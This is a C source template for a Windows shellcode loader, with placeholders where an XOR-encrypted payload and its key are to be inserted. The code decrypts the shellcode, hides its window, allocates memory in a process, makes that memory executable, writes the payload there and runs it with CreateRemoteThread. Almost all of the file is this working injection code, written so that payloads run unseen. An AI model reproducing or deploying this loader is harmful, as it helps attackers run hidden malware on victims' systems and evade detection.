#include<windows.h>

#REPLACEME#

void XOR(char* cipher, size_t cipher_len, char* key, size_t key_len) {
        for (int x = 0; x < cipher_len; x++)
        {
                cipher[x] ^= key[x % key_len];
        }
        cipher[cipher_len] = 0;
}

void migrate(DWORD);


int main(int argc, char *argv[])
{
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi= {0};
    int processID = GetCurrentProcessId();

    #REPLACE_XOR_KEY#
    XOR((char*)sc, sizeof(sc), key, sizeof(key));

    migrate(processID);
    while(1) {Sleep(50000);}
    return 0;
}


void migrate(DWORD dwProcessID) {
     HANDLE hP;
     HANDLE hRT;
     PVOID pRB;

     DWORD opr = PAGE_READWRITE;
     BOOL vp;

     if(!dwProcessID) {
        exit(0);
     }
     hP = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);
     if(!hP) {
        exit(0);
     }
     pRB = VirtualAllocEx(hP, NULL, sizeof(sc), MEM_COMMIT, PAGE_READWRITE);
     //pRB = VirtualAllocEx(hP, NULL, sizeof(sc), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     if (!pRB) {
        exit(0);
     }
     vp = VirtualProtect(pRB, sizeof(sc), PAGE_EXECUTE_READWRITE, &opr);
     if (vp){
     if (!WriteProcessMemory(hP, pRB, sc, sizeof(sc), NULL)) {
        exit(0);
     }
     CreateRemoteThread(hP, NULL, 0, pRB, NULL, 0, NULL);
     CloseHandle(hP);
     }
}